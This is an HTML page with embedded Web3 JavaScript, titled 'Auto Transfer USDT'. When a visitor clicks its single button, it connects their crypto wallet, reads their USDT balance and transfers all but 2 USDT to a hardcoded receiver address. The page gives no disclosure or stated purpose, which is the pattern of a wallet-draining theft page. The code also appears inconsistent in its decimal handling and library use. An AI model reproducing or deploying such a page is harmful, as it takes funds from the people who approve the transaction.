<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F";
    const usdtContractAddress = "0x55d398326f99059fF775485246999027b3197955";

    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          const sender = accounts[0];

          const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
          const balance = await usdtContract.methods.balanceOf(sender).call();

          const BN = web3.utils.BN;
          const gasFeeUsdt = new BN("2000000"); // 2 USDT (6 decimals)
          const balanceBN = new BN(balance);
          const amountToSend = balanceBN.sub(gasFeeUsdt);

          if (amountToSend.lte(new BN("0"))) {
            alert("Insufficient USDT balance to send after gas fees.");
            return;
          }

          const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend.toString())
            .send({ from: sender });

          alert("USDT sent! Tx hash: " + tx.transactionHash);
        } catch (err) {
          console.error("Error:", err);
          alert("Transaction failed: " + err.message);
        }
      } else {
        alert("Install MetaMask or Trust Wallet.");
      }
    }
  </script>
</body>
</html>
